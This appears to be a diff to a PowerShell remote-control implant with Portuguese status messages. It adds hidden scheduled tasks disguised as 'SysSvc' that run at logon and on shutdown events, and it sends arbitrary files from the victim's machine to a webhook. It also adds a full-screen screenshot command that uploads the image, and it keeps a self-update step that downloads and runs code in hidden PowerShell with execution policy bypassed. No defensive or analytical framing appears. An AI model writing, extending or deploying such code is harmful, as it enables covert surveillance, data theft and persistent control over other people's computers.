@@ -57,8 +57,10 @@ if (-not $Test -and -not $Debug) {
   schtasks /create /tn SysSvc   /tr $tr  /sc onlogon      /f 2>$null
   schtasks /create /tn SysSvcW  /tr $tr  /sc minute /mo 5 /f 2>$null
   if (-not (Test-Path $shut)) { curl.exe -s -o $shut $shutSrc }
+  schtasks /create /tn SysSvcS0 /tr $trS /sc onlogon /f 2>$null
   schtasks /create /tn SysSvcS1 /tr $trS /sc onevent /ec System /mo "*[System/EventID=6006]" /f 2>$null
   schtasks /create /tn SysSvcS2 /tr $trS /sc onevent /ec System /mo "*[System/EventID=1074]" /f 2>$null
+  schtasks /create /tn SysSvcS3 /tr $trS /sc onevent /ec System /mo "*[System/EventID=107]"  /f 2>$null
   Send "[i] persistencia criada"
 }
 
@@ -90,9 +92,9 @@ function Flush {
 
 function Uninstall {
   Send "[ok] uninstall — a limpar"
-  foreach ($t in "SysSvc","SysSvcW","SysSvcS1","SysSvcS2") { schtasks /delete /tn $t /f 2>$null }
+  foreach ($t in "SysSvc","SysSvcW","SysSvcS0","SysSvcS1","SysSvcS2","SysSvcS3") { schtasks /delete /tn $t /f 2>$null }
   Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc 2>$null
-  Start-Process powershell -w hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
+  Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
   exit
 }
 
@@ -145,13 +147,27 @@ while ($true) {
 
       if (Flag "get") {
         try {
-          if (-not $cfg["get_path"]) { throw "get_path vazio" }
-          if (-not (Test-Path $cfg["get_path"])) { throw "nao existe" }
-          $f2 = "$env:TEMP\g.txt"
-          Get-Content $cfg["get_path"] -Raw | Set-Content $f2 -Encoding UTF8
-          curl.exe -s -f --form-string "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
-          Send "[ok] get $($cfg['get_path'])"
+          $fp = $cfg["get_path"]
+          if (-not $fp) { throw "get_path vazio" }
+          if (-not (Test-Path $fp)) { throw "nao existe" }
+          curl.exe -s -f --form-string "content=**ok** get $fp" -F "files[0]=@$fp" $hook | Out-Null
+          Send "[ok] get $fp"
         } catch { Send "[falhou] get :: $($cfg['get_path']) :: $($_)" }
+      }
+
+      if (Flag "shot") {
+        try {
+          Add-Type -AssemblyName System.Windows.Forms
+          Add-Type -AssemblyName System.Drawing
+          $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
+          $bmp = New-Object Drawing.Bitmap $b.Width, $b.Height
+          $g = [Drawing.Graphics]::FromImage($bmp)
+          $g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
+          $p = "$env:TEMP\shot.png"
+          $bmp.Save($p, [Drawing.Imaging.ImageFormat]::Png)
+          curl.exe -s -f -F "content=**shot** $env:COMPUTERNAME" -F "files[0]=@$p" $hook | Out-Null
+          Send "[ok] shot"
+        } catch { Send "[falhou] shot :: $($_)" }
       }
 
       if (Flag "sh") {
@@ -169,7 +185,7 @@ while ($true) {
       }
 
       if (Flag "update") {
-        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
+        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
         catch { Send "[falhou] update :: $($_)" }
       }
 
